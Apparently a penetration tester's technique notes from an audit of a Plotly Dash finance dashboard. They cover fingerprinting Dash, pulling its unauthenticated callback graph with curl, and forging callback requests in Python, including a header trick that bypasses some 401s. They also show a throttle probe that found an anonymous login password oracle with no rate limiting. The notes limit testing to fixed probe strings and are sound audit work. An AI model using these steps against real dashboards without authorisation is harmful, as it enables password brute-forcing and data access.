# Plotly Dash — callback engine as an attack surface

Technique bank from the Arrakis audit (2026-10-12). Dash is common for internal analytics /
trading dashboards, and it ships three unauthenticated-by-default routes that most audits never
touch. The app under test was `analytics.arrakis.finance` (Bootstrap 5.3.6 + Dash 3.4.0, served
from Google Frontend).

## Fingerprint

```
/_dash-component-suites/dash/dash-renderer/build/dash_renderer.v3_4_0*.min.js
/_dash-component-suites/dash/dcc/dash_core_components.v3_4_0*.js
/_dash-component-suites/dash_bootstrap_components/...
```

Any HTML containing `_dash-component-suites` and `dash-renderer` is Dash. The `vN_N_M` in the
filename is the Dash version; `dash-core-components` / `dcc` vs `dash-html-components` does not
change anything below.

## The three routes

| Route | Auth by default | What it gives you |
|---|---|---|
| `GET /_dash-layout` | none | the whole component tree as JSON — every `dcc.Store` id, every input id |
| `GET /_dash-dependencies` | none | **the callback graph**: every callback's output string, inputs, state, `prevent_initial_call`, `clientside_function` |
| `POST /_dash-update-component` | varies | **invokes a callback** — this is the server-side execution surface |

```
curl -s https://TARGET/_dash-layout | head -c 1200
curl -s https://TARGET/_dash-dependencies -o deps.json
python3 -c "import json;d=json.load(open('deps.json'));print(len(d),'callbacks')"
```

On the live target `/_dash-dependencies` returned **296 callbacks / 160 KB to an anonymous GET**.
Read it before anything else: it names the auth gate itself. Look for callbacks whose inputs are
`<something>-password.value` / `.n_submit`, and whose output includes `auth-store.data`.

## Invoking a callback

The `output` string in the request must match the registry **exactly**. A partial or re-joined
string does not error loudly — Dash answers `200 {"multi":true,"response":{}}` with an empty
response, which is easy to misread as "the callback is blocked".

```python
import json, urllib.request
d   = json.load(open('deps.json'))
cb  = d[i]                                   # pick by index from the graph
req = {
  "output":  cb["output"],                   # copy VERBATIM from _dash-dependencies
  "outputs": [{"id": o.rsplit(".", 1)[0].lstrip("."), "property": o.rsplit(".", 1)[1]}
              for o in cb["output"].split("...") if o],
  "inputs":  [{"id": i["id"], "property": i["property"],
               "value": <typed value>} for i in cb["inputs"]],
  "state":   [{"id": s["id"], "property": s["property"], "value": None} for s in cb["state"]],
  "changedPropIds": [f"{cb['inputs'][0]['id']}.{cb['inputs'][0]['property']}"],
}
r = urllib.request.Request(BASE + "/_dash-update-component", data=json.dumps(req).encode(),
      headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0",
               "Referer": BASE + "/", "Origin": BASE})
```

Response shape: `{"multi":true,"response":{"<component-id>":{...props...}}}` — keys are the plain
component ids, so you can read `response["login-error"]["children"]["props"]["children"]` directly.

## Pitfalls that cost cycles

- **`Referer` + `Origin` are load-bearing on some deployments.** Without them the same POST is
  `401 {"error":"unauthorized"}` even though `GET /` and `GET /_dash-dependencies` are wide open.
  Send both (and `X-Requested-With: XMLHttpRequest` for good measure) *before* concluding the
  callback endpoint is gated. Once set, the earlier 401s become 200s.
- **`value` types matter.** Passing `1` where the component expects a string produced
  `500 Internal Server Error`; the same callback with `"probe"` answered 200. Mirror the type the
  component would send (`n_submit` = int, `value` = string).
- **Not every callback is allowlisted.** On the live target, several data callbacks returned 401 to
  an anonymous caller while the login callback returned 200 (the login must be reachable before you
  have a session). Map which ones answer by POSTing each `cb["output"]` and sorting by status — do
  not assume "one works, so all work" or "one 401, so none work".
- **`/_dash-layout` shows the Stores, not their values.** A `dcc.Store(storage_type="session")` is
  client-side; the server-side gate is the callback check, not the Store.

## The finding pattern: anonymous password oracle

If a login callback is reachable anonymously and the response distinguishes a wrong guess, you have
an oracle. Measure the throttle before writing anything:

```python
codes = {}
for i in range(20):
    c, dt, body = post(f"bruteprobe{i}")     # fixed probe strings, NOT a dictionary
    codes[c] = codes.get(c, 0) + 1
print(codes)   # {200: 20} -> no rate limit, no lockout
```

Live result: `{200: 20}`, ~1.2-1.6 s per attempt, no 429, and byte-identical bodies across runs
(md5 match) proving the oracle is deterministic. Wrong guess returned
`{"login-error": {"children": {"props": {"children": "Invalid password", ...}}}}`.

**Bound the test honestly and say so in the report:** 20 fixed probe strings to measure the
throttle is a control check; running a dictionary is not. Never escalate to a real wordlist, and
state in the write-up that you never obtained the password and never reached an authenticated page.

Severity framing that holds up: the bug is *not* "the login is callable" (it must be). It is
"the only control in front of internal <data class> dashboards is a secret with no rate limit, no
lockout and no CAPTCHA" — CWE-307 + CWE-204. Note explicitly that the data callbacks still answer
401 anonymously, so authorisation itself is intact; the missing piece is the throttle.

## Reference

- `_dash-dependencies` graph fields: `output` (joined string), `inputs[]`, `state[]`,
  `clientside_function` (when non-null the callback runs in the browser — no server hit),
  `prevent_initial_call`, `running` (the spinner props).
